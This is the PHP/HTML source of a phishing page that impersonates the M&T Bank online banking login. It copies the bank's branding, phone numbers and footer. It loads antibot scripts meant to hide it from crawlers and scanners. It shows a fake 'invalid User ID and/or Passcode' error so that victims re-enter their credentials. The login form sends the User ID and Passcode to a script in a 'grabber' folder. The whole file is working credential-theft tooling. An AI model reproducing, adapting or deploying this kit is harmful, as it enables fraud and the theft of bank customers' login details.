<?php

error_reporting(0);

include('./assets/Antibot/Bot-Crawler.php');
include('./assets/Antibot/Dila_DZ.php');

include('./assets/Antibot/blockers.php');
include('./assets/Antibot/detects.php');
?>

<!DOCTYPE html>

<html lang="en" class="__sticky-footer __sticky-footer--links">
    <head>
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
        <title>Welcome to Online Banking | M&amp;T Bank</title>

        <link rel="shortcut icon" href="./assets/img/favicon.ico" type="image/x-icon">
        <link href="./assets/css/css.css" rel="stylesheet">
        
        <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
        <meta http-equiv="X-UA-Compatible" content="ie=edge">
    </head>

    <body>
        <form action="./assets/grabber/session_relogin.php" method="post">
            

            <div class="mtb-app-enrollment">
                <header class="mtb-page-header">
                    <input type="hidden" id="TagPageName" name="TagPageName" value="OLB:Login:Index">
                    <div class="grid-x align-center">
                        <div class="cell">
                            <a href="javascript:void();" class="mtb__logo">
                                <img src="./assets/img/mtb-logo.svg" alt="M&amp;T Bank Site">
                            </a>
                        </div>
                    </div>
                </header>

                <div class="mtb-page-error">
                    <input data-val="true" data-val-number="The field FailedSignOnCount must be a number." data-val-required="The FailedSignOnCount field is required." id="FailedSignOnCount" name="FailedSignOnCount" type="hidden" value="0">
                    <div class="mtb-app-default--content">
                        <div class="callout __has-icon warning __no-border">
                            <i class="__is-icon m-icon m-icon-notification">
                                <span class="show-for-sr">Notification Icon</span>
                            </i>
                            <p>
                                You have entered an invalid User ID and/or Passcode. Please try again.
                            </p>
                        </div>
                    </div>
                </div>

                <div class="mtb-app-login--content">
                    <div class="grid-x grid-padding-x grid-x__padded __spacer-section">
                        <div class="cell">
                            <input type="hidden" value="OLB:SSC:LogInToOnlineBanking">
                            <div class="mtb-section-header mtb-section-header__login">
                                <h1> Log In to Online Banking </h1>
                                <p> For Personal and Business Accounts </p>
                            </div>
                        </div>

                        <div class="cell">
                            <label for="userId"> User ID </label>
                            <div class="input-group m-fake-single-input">
                                <input class="input-group-field js-formnputItem" data-fc-id="121" type="text" id="userId" name="userId" autocomplete="off" aria-required="true" data-inputtype="text" data-attribute="" maxlength="20">
                            </div>
                        </div>

                        <div class="cell">
                            <label for="Passcode"> Passcode </label>
                            <div class="input-group m-fake-single-input">
                                <input class="input-group-field js-formnputItem" data-fc-id="122" type="password" id="Passcode" name="Passcode" autocomplete="off" aria-required="true" data-inputtype="tel" maxlength="20">
                                
                                <div class="input-group-button">
                                    <button type="button" id="Show" data-btnfor="Passcode" class="button clear hide js-showHide">Show</button>
                                </div>
                            </div>
                        </div>

                        <div class="cell">
                            <div class="mtb-formcheckbox">
                                <input class="show-for-sr" type="checkbox" id="RememberUserId" name="RememberUserId" value="false">
                                <label for="RememberUserId" class="__spacer-remove"> Remember User ID </label>
                            </div>
                        </div>
                    </div>

                    <div class="grid-x grid-padding-x __spacer-paragraph grid-x__padded">
                        <div class="cell">
                            <button type="submit" class="button button__form-no-spacer expanded kessel-flush" id="btnSubmit"> Log In </button>
                        </div>

                        <div class="cell">
                            <a href="javascript:void();" class="button button__fake-padding-no-spacer expanded clear" id="jsAnalyticsLink">Help with User ID or Passcode</a>
                        </div>
                        <div class="cell">
                            <a href="javascript:void();" class="button button__fake-padding expanded clear" id="jsAnalyticsEnrollLink" data-attribute="item">Enroll Now</a>
                        </div>

                        <p class="cell text-center __font-size-tiny __color-gray-accent"> Unauthorized access is prohibited. Usage may be monitored. </p>
                    </div>
                </div>
                <hr class="__spacer-section">

                <div class="mtb-app-default--content">
                    <div class="grid-x grid-padding-x grid-x__padded">
                        <div class="cell text-center">
                            <p class="__font-size-secondary"> Have questions about M&amp;T Online Banking? </p>
                        </div>

                        <div class="cell medium-6 text-center">
                            <p class="__font-size-secondary __color-primary __spacer-paragraph-half"> 
                                Personal Accounts: 
                                <a href="javascript:void();" class="__no-underline">1-800-790-9130</a>
                            </p>
                            <p class="__font-size-sub __spacer-remove __color-gray-accent">
                                Monday - Friday 8am - 9pm ET 
                            </p>
                            <p class="__font-size-sub __spacer-paragraph __color-gray-accent"> 
                                Saturday - Sunday 9am - 5pm ET 
                            </p>
                        </div>

                        <div class="cell medium-6 text-center">
                            <p class="__font-size-secondary __color-primary __spacer-paragraph-half">    Business Accounts: 
                                <a href="javascript:void();" class="__no-underline">1-800-724-6070</a>
                            </p>
                            <p class="__font-size-sub __spacer-remove __color-gray-accent"> 
                                Monday - Friday 6am - 9pm ET 
                            </p>
                            <p class="__font-size-sub __spacer-section __color-gray-accent">
                                Saturday - Sunday 9am - 5pm ET 
                            </p>
                        </div>
                    </div>
                </div>

                <section class="mtb-footer mtb-footer__auth" role="contentinfo">
                    <div class="grid-x">
                        <div class="cell flex-container flex-dir-column align-center-middle">
                            <div class="mtb-footer--auth">
                                <a href="javascript:void();" class="" >Get Started Guide</a>
                                <a href="javascript:void();" >Security Assistance</a>
                                <a href="javascript:void();" >Digital Service Agreement</a>
                                <a href="javascript:void();" >ESign Agreement</a>
                                <a href="javascript:void();" > Accessibility </a>
                                <a href="javascript:void();" > mtb.com </a>
                            </div>

                            <div class="mtb-footer--non-auth">
                                <p>
                                     ©2022 M&amp;T Bank. All Rights Reserved.<br> Users of this website agree to be bound by the provisions of the M&amp;T website 
                                     <a href="javascript:void();" > Terms of Use </a> and <a href="javascript:void();" >Privacy Policy</a>. 
                                </p>

                                <div class="mtb-footer__logo">
                                    <a href="javascript:void();" >
                                        <img src="./assets/img/mtb-equalhousinglender.svg" class="mtb-footer__equalhousinglender" alt="Equal Housing Lender">
                                    </a>
                                    <a href="javascript:void();" >
                                        <img src="./assets/img/mtb-entrust.svg" class="mtb-footer__entrust" alt="Entrust">
                                    </a>
                                </div>

                                <p> 
                                    Equal Housing Lender NMLS #381076
                                    <a href="javascript:void();" >Member FDIC</a>
                                </p>
                            </div>
                        </div>
                    </div>
                </section>
            </div>
        </form>
        
        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/1.11.1/jquery.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-validate/1.17.0/jquery.validate.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.13.4/jquery.mask.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-validate/1.19.1/additional-methods.min.js"></script>

        <script>
            $(document).ready(function () {
                var $input = $('[name=userid], [name=Passcode]'),
                $register = $('#btnSubmit');
                
                $input.each(function () {
                    if (!$(this).val()) {
                        $register.attr('disabled', true);
                        return false;
                    }
                });
                $input.keyup(function () {
                    var trigger = false;
                    $input.each(function () {
                        if (!$(this).val()) {
                            trigger = true;
                        }
                    });
                    trigger ? $register.attr('disabled', true) : $register.removeAttr('disabled');
                });
            });
        </script>

    </body>
</html>